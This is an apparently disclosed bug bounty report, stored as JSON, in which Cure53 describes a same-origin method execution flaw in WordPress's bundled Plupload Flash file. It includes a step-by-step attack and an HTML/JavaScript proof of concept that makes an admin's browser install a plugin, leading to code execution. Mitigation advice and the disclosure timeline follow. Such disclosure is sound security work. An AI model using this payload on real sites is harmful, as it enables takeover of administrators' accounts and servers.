\u003ca title=\"https://github.com/moxiecode/moxie/blob/d91c63758c1d372a38615e8b966b50545faa70ca/src/flash/src/mxi/Utils.as#L102\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fmoxiecode%2Fmoxie%2Fblob%2Fd91c63758c1d372a38615e8b966b50545faa70ca%2Fsrc%2Fflash%2Fsrc%2Fmxi%2FUtils.as%23L102\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/moxiecode/moxie/blob/d91c63758c1d372a38615e8b966b50545faa70ca/src/flash/src/mxi/Utils.as#L102\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe sanitization in this file is done quite well and strict enough to prohibit XSS attacks. An attacker can however select a different type of attack, also known as SOME or Reverse Clickjacking.\u003c/p\u003e\n\n\u003cp\u003eThe affected code can be found here:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight actionscript\"\u003e\u003ccode\u003e\u003cspan class=\"kr\"\u003eprivate\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003e_fireEvent\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eevt\u003c/span\u003e\u003cspan class=\"o\"\u003e:*\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eobj\u003c/span\u003e\u003cspan class=\"o\"\u003e:*\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e\u003cspan class=\"nb\"\u003evoid\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003etry\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003eExternalInterface\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecall\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eeventDispatcher\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eevt\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eobj\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003ecatch\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerr\u003c/span\u003e\u003cspan class=\"o\"\u003e:*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"c1\"\u003e//_fireEvent(\u0026quot;Exception\u0026quot;, { name: \u0026#39;RuntimeError\u0026#39;, message: 4 });\u003c/span\u003e\n\n        \u003cspan class=\"c1\"\u003e// throwing an exception would be better here\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe method is being called from within the \u003ccode\u003e_init()\u003c/code\u003e method and receives an event and an optional object. The actual event dispatcher is stored as an object member at a different place in the code.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eCalling _fireEvent:\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight actionscript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003eMoxie\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003euid\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eUtils\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitize\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;uid\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e    \n\n\u003cspan class=\"p\"\u003e[...]\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003e_fireEvent\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eMoxie\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003euid\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;::Init\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e    \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003eSetting the event dispatcher:\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight actionscript\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e// Event dispatcher\u003c/span\u003e\n\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehasOwnProperty\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;target\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"sr\"\u003e/^\u003c/span\u003e\u003cspan class=\"se\"\u003e[\\w\\.]\u003c/span\u003e\u003cspan class=\"sr\"\u003e+$/\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etest\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;target\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eeventDispatcher\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;target\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe sanitation for both the event dispatcher and the event string is quite tough and only allows word characters in one case, and word characters and the dot in the other case:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight actionscript\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ehasOwnProperty\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;target\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"sr\"\u003e/^\u003c/span\u003e\u003cspan class=\"se\"\u003e[\\w\\.]\u003c/span\u003e\u003cspan class=\"sr\"\u003e+$/\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etest\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;target\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e]))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight actionscript\"\u003e\u003ccode\u003e\u003cspan class=\"kr\"\u003estatic\u003c/span\u003e \u003cspan class=\"kr\"\u003epublic\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003esanitize\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003estr\u003c/span\u003e\u003cspan class=\"o\"\u003e:\u003c/span\u003e\u003cspan class=\"nx\"\u003eString\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eString\u003c/span\u003e\n\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e// allow only [a-zA-Z0-9_]\u003c/span\u003e\n    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"sr\"\u003e/\u003c/span\u003e\u003cspan class=\"se\"\u003e[^\\w]\u003c/span\u003e\u003cspan class=\"sr\"\u003e/g\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"p\"\u003e[...]\u003c/span\u003e\n\u003cspan class=\"nx\"\u003eMoxie\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003euid\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eUtils\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esanitize\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eparams\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;uid\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eDespite the strong validation, the attacker can still cause damage - tremendous damage too. This is done by executing a SOME attack. This kind of attack allows to generate certain types of events by abusing the callback.\u003c/p\u003e\n\n\u003cp\u003eAn attacker can for example click a button on the same domain as the Flash file by instructing the Flash file, not to execute a pre-defined callback but rather by making use of certain DOM properties that give more or less direct access to the button and then by executing a \u003ccode\u003eclick()\u003c/code\u003e method. Let’s have a look at a trivial example first and imagine \u003cem\u003evictim.com\u003c/em\u003e that hosts both the Plupload SWF and some logic, where a click on a button will, let’s say, delete a user:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eAttacker crafts a specific payload\u003c/li\u003e\n\u003cli\u003eAttacker then lures logged in victim to a website \u003c/li\u003e\n\u003cli\u003eThe website will do the following steps \u003c/li\u003e\n\u003cli\u003eOpen the Plupload SWF in a new tab\u003c/li\u003e\n\u003cli\u003eHave the SWF use the target parameter \u003ccode\u003eopener.document.body.firstElementChild.firstElementChild.click\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eWhile the SWF still loads, the \u003ccode\u003eopener\u003c/code\u003e location changes\u003c/li\u003e\n\u003cli\u003eIt navigates to \u003cem\u003evictim.com/admin\u003c/em\u003e\n\u003c/li\u003e\n\u003cli\u003eNow, SWF and page are on the same domain\u003c/li\u003e\n\u003cli\u003eSWF is now allows to perform clicks on opener. The button will be clicked\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eDone, that is the whole attack in simple. Open SWF in a new window, define a callback that traverses to an important element and clicks it, navigate the opener to the page containing the element, have the click happen.\u003c/p\u003e\n\n\u003cp\u003eNow, the following more specific PoC describes the attack against WordPress and shows, how we can turn the SOME into an RCE!\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eAn attacker sends a link that contains the exploit to an authenticated user\u003c/li\u003e\n\u003cli\u003eThe user (victim) opens the link and clicks the button\u003c/li\u003e\n\u003cli\u003eThe exploit opens a new window to the SWF file, meanwhile the other window is loading the plugin page\u003c/li\u003e\n\u003cli\u003eThe exploit then triggers the install button of a malicious plugin\u003c/li\u003e\n\u003cli\u003eThe plugin is installed and the malicious codes are uploaded on the server accordingly\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;button\u003c/span\u003e \u003cspan class=\"na\"\u003eonclick=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;fire()\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003eClick\u003cspan class=\"nt\"\u003e\u0026lt;/button\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;script\u0026gt;\u003c/span\u003e\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003efire\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n \u003cspan class=\"nx\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ejavascript:setTimeout(\u0026quot;location=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ehttp://example.com/wp-includes/js/plupload/plupload.flash.swf?%#target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click\u0026amp;uid%g=hello\u0026amp;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;, 2000)\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"nx\"\u003esetTimeout\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003elocation=\u0026quot;http://example.com/wp-admin/plugin-install.php?tab=plugin-information\u0026amp;plugin=wp-super-cache\u0026amp;TB_iframe=true\u0026amp;width=600\u0026amp;height=550\u0026quot;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch1 id=\"affected-systems\"\u003eAffected Systems\u003c/h1\u003e\n\n\u003cp\u003eAll WordPress instances that allow to directly call this file. That should be the absolute majority. Google finds a couple of them but we assume it is actually significantly more\u003ca href=\"/redirect?url=https%3A%2F%2Fwww.google.com%2Fsearch%3Fq%3Dinurl%3A%2Fwp-includes%2Fjs%2Fplupload%2Fplupload.flash.swf%2Bext%3Aswf%26channel%3Dfs%26start%3D10\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003e⁹\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eHere is some numbers that other people guesstimate:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca title=\"https://managewp.com/14-surprising-statistics-about-wordpress-usage\" href=\"/redirect?url=https%3A%2F%2Fmanagewp.com%2F14-surprising-statistics-about-wordpress-usage\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://managewp.com/14-surprising-statistics-about-wordpress-usage\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://www.quora.com/How-many-websites-are-built-on-Wordpress\" href=\"/redirect?url=https%3A%2F%2Fwww.quora.com%2FHow-many-websites-are-built-on-Wordpress\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.quora.com/How-many-websites-are-built-on-Wordpress\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"https://wordpress.com/activity/\" href=\"/redirect?url=https%3A%2F%2Fwordpress.com%2Factivity%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://wordpress.com/activity/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eFurther note, browser-based XSS filters will not detect the attack and hence not protect here.\u003c/p\u003e\n\n\u003ch1 id=\"mitigation\"\u003eMitigation\u003c/h1\u003e\n\n\u003cul\u003e\n\u003cli\u003ePrevent direct access to all Flash files in the WordPress folder (\u003ccode\u003eContent-Disposition\u003c/code\u003e headers might help)\u003c/li\u003e\n\u003cli\u003eConfigure your WAF to block direct access to this file\u003c/li\u003e\n\u003cli\u003eWait for the fix and update Wordpress\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch1 id=\"credits\"\u003eCredits\u003c/h1\u003e\n\n\u003cp\u003eCredits for this find go to Soroush Dalili for initially documenting the attack technique that helped bypassing “The GET Killer”.\u003c/p\u003e\n\n\u003cp\u003eFurther credits go to Kinugawa, Filedescriptor and Heiderich of Cure53 for discovering the bug in WordPress default installations and developing an attack scenario leading to RCE by using SOME to install rogue WordPress Plugins.\u003c/p\u003e\n","bounty_amount":"1337.0","formatted_bounty":"$1,337","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-07-10T12:50:14.637Z","allow_singular_disclosure_after":-141060933.73511392,"singular_disclosure_allowed":true,"vote_count":48,"voters":["static","d1m0ck","bobrov","harisec","hunter","michiel","wkcaj","spam404","preben","mik317","and 38 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":928392,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Also, as for possible mitigation advice, we are fairly sure that this will do (via .htaccess where applicable):\n\n```\n\u003cFilesMatch \"\\.(swf)$\"\u003e\nHeader set Content-Disposition attachment\n\u003c/FilesMatch\u003e\n```","markdown_message":"\u003cp\u003eAlso, as for possible mitigation advice, we are fairly sure that this will do (via .htaccess where applicable):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;FilesMatch \u0026quot;\\.(swf)$\u0026quot;\u0026gt;\nHeader set Content-Disposition attachment\n\u0026lt;/FilesMatch\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2016-04-26T10:09:03.643Z","updated_at":"2016-04-26T10:09:03.643Z","actor":{"username":"cure53","cleared":false,"url":"/cure53","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/123/1c801729a8988a0b6873c3d9ccf131e2a1488011_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":928443,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the report, this too has sent to the WordPress security team for review.","markdown_message":"\u003cp\u003eThanks for the report, this too has sent to the WordPress security team for review.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-04-26T10:46:54.127Z","updated_at":"2016-04-26T10:46:54.127Z","actor":{"username":"vortfu","cleared":false,"url":"/vortfu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/982/1ef285fb263d30f189dc6a8038e1d5c46086e9d9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":936576,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"~~Any news on this one?~~\n\nJust saw the discussion on the slack channel. Nvm! :)","markdown_message":"\u003cp\u003e\u003cdel\u003eAny news on this one?\u003c/del\u003e\u003c/p\u003e\n\n\u003cp\u003eJust saw the discussion on the slack channel. Nvm! :)\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-02T14:57:40.626Z","updated_at":"2016-05-02T15:04:22.171Z","actor":{"username":"cure53","cleared":false,"url":"/cure53","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/123/1c801729a8988a0b6873c3d9ccf131e2a1488011_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":948780,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi all! \n\nSince the bug has been fixed and the new version is out, what's the status here?\nWe are planning, as discussed on slack, to release  our write-up on Friday, 1pm CEST.","markdown_message":"\u003cp\u003eHi all! \u003c/p\u003e\n\n\u003cp\u003eSince the bug has been fixed and the new version is out, what\u0026#39;s the status here?\u003cbr\u003e\nWe are planning, as discussed on slack, to release  our write-up on Friday, 1pm CEST.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-10T13:52:24.758Z","updated_at":"2016-05-10T13:52:24.758Z","actor":{"username":"cure53","cleared":false,"url":"/cure53","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/123/1c801729a8988a0b6873c3d9ccf131e2a1488011_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":985387,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2016-05-26T16:36:29.046Z","updated_at":"2016-05-26T16:36:29.046Z","actor":{"username":"vortfu","cleared":false,"url":"/vortfu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/982/1ef285fb263d30f189dc6a8038e1d5c46086e9d9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"cure53","url":"/cure53"},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1000167,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi all, two questions - is there any plans for a bug bounty on this one, and will the ticket be opened for public access anytime soon?","markdown_message":"\u003cp\u003eHi all, two questions - is there any plans for a bug bounty on this one, and will the ticket be opened for public access anytime soon?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-05T08:23:10.201Z","updated_at":"2016-06-05T08:23:10.201Z","actor":{"username":"cure53","cleared":false,"url":"/cure53","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/123/1c801729a8988a0b6873c3d9ccf131e2a1488011_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1007898,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-10T12:49:54.809Z","updated_at":"2016-06-10T12:49:54.809Z","actor":{"url":"/automattic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Automattic"}},"bounty_amount":"1337.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"automattic","collaborator":{"username":"cure53","url":"/cure53"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1007900,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-10T12:50:14.501Z","updated_at":"2016-06-10T12:50:14.501Z","first_to_agree":true,"actor":{"username":"vortfu","cleared":false,"url":"/vortfu","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/004/982/1ef285fb263d30f189dc6a8038e1d5c46086e9d9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1007924,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Cool, thanks :)","markdown_message":"\u003cp\u003eCool, thanks :)\u003c/p\u003e\n","automated_response":false,"created_at":"2016-06-10T13:14:08.691Z","updated_at":"2016-06-10T13:14:08.691Z","actor":{"username":"cure53","cleared":false,"url":"/cure53","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/072/123/1c801729a8988a0b6873c3d9ccf131e2a1488011_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1061480,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-07-10T12:50:19.706Z","updated_at":"2016-07-10T12:50:19.706Z","actor":{"url":"/automattic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Automattic"}},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}